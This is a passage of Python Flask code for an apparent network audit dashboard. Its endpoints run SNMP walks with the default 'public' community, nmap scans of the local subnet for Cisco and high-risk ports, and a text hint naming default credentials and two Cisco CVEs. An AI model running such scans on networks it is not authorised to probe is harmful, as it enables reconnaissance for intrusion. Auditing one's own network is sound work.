            # Auto-detect gateway
            result = run_capture("hostname -I", timeout=2)
            if result.get('returncode') == 0:
                ip_raw = result.get('stdout', '').strip()
                if ip_raw:
                    my_ip = ip_raw.split()[0]
                    target: str = ".".join(my_ip.split(".")[:3] + ["1"])
        
        if not target or not re.match(r"^[0-9.]+$", target):
            return jsonify(["ERROR: No target. Use ?target=192.168.1.1"])
        
        # Use snmpwalk to query Cisco VLAN OID
        cmd: str = f"snmpwalk -v2c -c public {target} 1.3.6.1.4.1.9.9.46.1.3.1.1.2 2>/dev/null"
        result = run_capture(cmd, timeout=10)
        
        lines = [l.strip() for l in result.get('stdout', '').split('\n') if l.strip()][:30]
        
        if not any("1.3.6" in l for l in lines):
            return jsonify([
                "SNMP VLAN OID not available.",
                "Install: apt install snmp",
                "Or ensure target has SNMP enabled with community 'public'"
            ])
        
        return jsonify(lines)

    except Exception as e:
        return jsonify([f"ERROR: {str(e)}"])

CISCO_HINTS = """Cisco common ports: 23 Telnet, 22 SSH, 161 SNMP, 443 HTTPS, 80 HTTP.
Known issues: default creds, CVE-2018-0171 (Smart Install), CVE-2019-12643 (IOS XE).
Use only on authorized networks."""

@app.route('/api/cisco_audit')
def cisco_audit() -> Response:
    try:
        result = run_capture("hostname -I", timeout=2)
        if result.get('returncode') != 0 or not result.get('stdout'):
            return jsonify(["ERROR: No network detected"])
        
        my_ip = result.get('stdout', '').strip().split()[0]
        subnet: str = f"{'.'.join(my_ip.split('.')[:3])}.0/24"
        
        # Scan for Cisco common ports
        cmd: str = f"nmap -sT -p 23,22,161,443,80 --open -n {subnet} --exclude {my_ip} 2>&1"
        result = run_capture(cmd, timeout=60)
        
        output = result.get('stdout', '')
        parsed = parse_nmap_output(output)
        
        result_lines: list[str] = [f"TARGET: {subnet}", CISCO_HINTS, ""]
        for device in parsed:
            result_lines.append(f"{device['ip']}:")
            for port_info in device['ports']:
                result_lines.append(f"  Port {port_info['port']}: {port_info['service']}")
        
        if not parsed:
            result_lines.append("No Cisco devices found on common ports")
        
        return jsonify(result_lines[:50])

    except Exception as e:
        return jsonify([f"ERROR: {str(e)}"])

@app.route('/api/nmap', strict_slashes=False)
def nmap_scan() -> Response:
    try:
        # Get local subnet
        result = run_capture("hostname -I", timeout=3)
        if result.get('returncode') != 0 or not result.get('stdout'):
            return jsonify(["ERROR: No network detected"])
        
        my_ip = result.get('stdout', '').strip().split()[0]
        subnet: str = f"{'.'.join(my_ip.split('.')[:3])}.0/24"
        
        # Scan for high-risk ports (FTP, Telnet, SMB, RDP, HTTP-alt)
        cmd: str = f"sudo nmap -sS -p 21,23,445,3389,8080 --open -n {subnet} --exclude {my_ip} 2>&1"
        result = run_capture(cmd, timeout=60)
        
        if result.get('timeout'):
            return jsonify(["TIMEOUT: Scan took too long"])
        
        output = result.get('stdout', '')
        parsed = parse_nmap_output(output)
        
        results: list[str] = [f"TARGET: {subnet}"]
        
        if parsed:
            for device in parsed:
                for port_info in device['ports']:
                    results.append(f"{device['ip']} > {port_info['port']} ({port_info['service']})")
        else:
            results.append("SECURE: No vulnerable ports found")
        
        return jsonify(results)
    except Exception as e:
        return jsonify([f"FAIL: {str(e)}"])

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
